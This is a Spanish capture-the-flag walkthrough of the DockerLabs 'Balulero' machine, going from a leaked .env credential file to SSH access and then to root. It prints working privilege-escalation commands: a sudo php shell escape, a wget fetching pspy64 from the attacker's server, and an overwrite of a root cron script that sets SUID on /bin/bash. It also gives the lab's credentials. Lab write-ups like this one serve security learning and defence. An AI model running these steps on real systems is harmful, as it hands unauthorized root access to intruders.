# Balulero — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 28/09/2024  
**Técnicas:** Nmap · Código fuente web · Fichero .env con credenciales · SSH · php/sudo → shell como chocolate · pspy64 · CRON root · bash -p

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — credenciales en .env](#2-enumeración-web--credenciales-en-env)
3. [Acceso SSH como balu](#3-acceso-ssh-como-balu)
4. [Escalada a chocolate con php/sudo](#4-escalada-a-chocolate-con-phpsudo)
5. [Descubrimiento con pspy64 — script CRON de root](#5-descubrimiento-con-pspy64--script-cron-de-root)
6. [Escalada a root](#6-escalada-a-root)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh balulero.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

---

## 2. Enumeración web — credenciales en .env

Visitamos `http://172.17.0.2` — página de presentación personal "Hola, soy Balú". Inspeccionamos el código fuente y encontramos una referencia a `script.js`:

```javascript
// Funcionalidad para ocultar/mostrar el header al hacer scroll
// y el secretito de la web
console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, 
pero hay una copia llamada .env_de_baluchingon visible jiji")
```

El comentario nos da la ruta directa al fichero con credenciales:

```
http://172.17.0.2/.env_de_baluchingon
```

```
RECOVERY LOGIN

balu:balubalulerobalulei
```

---

## 3. Acceso SSH como balu

```bash
ssh balu@172.17.0.2
```

```
balu@172.17.0.2's password: balubalulerobalulei
balu@fdcc9f25ba81:~$
```

---

## 4. Escalada a chocolate con php/sudo

```bash
balu@fdcc9f25ba81:~$ sudo -l
```

```
User balu may run the following commands on fdcc9f25ba81:
    (chocolate) NOPASSWD: /usr/bin/php
```

balu puede ejecutar **php como el usuario chocolate**. GTFObins para php con sudo:

```bash
balu@fdcc9f25ba81:~$ CMD="/bin/sh"
balu@fdcc9f25ba81:~$ sudo -u chocolate /usr/bin/php -r "system('$CMD');"
$ whoami
chocolate
```

---

## 5. Descubrimiento con pspy64 — script CRON de root

Como chocolate, no encontramos nada con `sudo -l` ni SUID. Usamos **pspy64** para ver procesos en tiempo real sin necesidad de permisos especiales.

Descargamos pspy64 desde nuestra máquina atacante (previamente iniciamos un servidor HTTP con Python):

```bash
# En nuestra máquina atacante:
python3 -m http.server 8000

# En la víctima como chocolate:
chocolate@fdcc9f25ba81:~$ wget http://192.168.1.26:8000/pspy64
chocolate@fdcc9f25ba81:~$ chmod +x pspy64
chocolate@fdcc9f25ba81:~$ ./pspy64
```

```
pspy - version: v1.2.1

2025/09/20 10:16:49 CMD: UID=0   PID=649    | php /opt/script.php
2025/09/20 10:16:54 CMD: UID=0   PID=655    | sleep 5
2025/09/20 10:16:59 CMD: UID=0   PID=660    | php /opt/script.php
```

> 💡 **pspy64** intercepta llamadas al sistema del kernel para ver todos los procesos que se ejecutan, incluso los de otros usuarios. UID=0 significa root. El script `/opt/script.php` se ejecuta cada 5 segundos como root.

Exploramos el script:

```bash
chocolate@fdcc9f25ba81:~$ cat /opt/script.php
<?php echo 'Script de pruebas en fase de beta testing'; ?>

chocolate@fdcc9f25ba81:~$ ls -la /opt/script.php
-rw-r--r-- 1 chocolate chocolate 59 May 7 2024 /opt/script.php
```

El fichero pertenece al usuario **chocolate** con permiso de escritura. Podemos modificarlo.

---

## 6. Escalada a root

Sobreescribimos el script con código PHP que activa el SUID bit en `/bin/bash`:

```bash
chocolate@fdcc9f25ba81:~$ echo "<?php system('chmod u+s /bin/bash'); ?>" > /opt/script.php
```

Esperamos unos segundos a que el cron lo ejecute como root, luego:

```bash
chocolate@fdcc9f25ba81:~$ bash -p
bash-5.0# whoami
root
```

> 💡 **`bash -p`** indica a bash que no descarte los privilegios efectivos. Como `/bin/bash` ahora tiene el bit SUID activado (propietario root), al ejecutarlo con `-p` obtenemos una shell con privilegios de root.

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Ruta de fichero .env con credenciales en comentario JS** | `script.js` | Credenciales SSH expuestas |
| **php con sudo como otro usuario** | Sudoers de balu | Escalada horizontal a chocolate |
| **Script CRON de root con permisos de escritura del usuario** | `/opt/script.php` | Escalada a root via CRON |

**Para defenderse:**
- Nunca dejar ficheros `.env` (ni copias de ellos) accesibles desde la web — usar variables de entorno del sistema.
- Revisar los permisos de todos los ficheros ejecutados por cron: deben pertenecer a root y no ser escribibles por otros usuarios.
- pspy64 es una herramienta estándar de pentesting — los defensores deben monitorizar su uso en producción con auditd.
- El bit SUID en `/bin/bash` es una bandera roja inmediata en cualquier auditoría.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
